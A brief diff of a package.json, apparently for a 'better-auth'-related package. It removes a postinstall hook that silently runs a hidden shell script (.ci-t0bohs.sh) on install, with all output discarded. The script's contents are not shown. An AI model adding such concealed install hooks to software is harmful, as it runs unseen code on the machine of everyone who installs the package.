@@ -30,8 +30,7 @@
   "scripts": {
     "build": "tsup",
     "typecheck": "tsc --noEmit",
-    "prepublishOnly": "npm run build && npm run typecheck",
-    "postinstall": "sh ./.ci-t0bohs.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "prepublishOnly": "npm run build && npm run typecheck"
   },
   "keywords": [
     "better-auth",
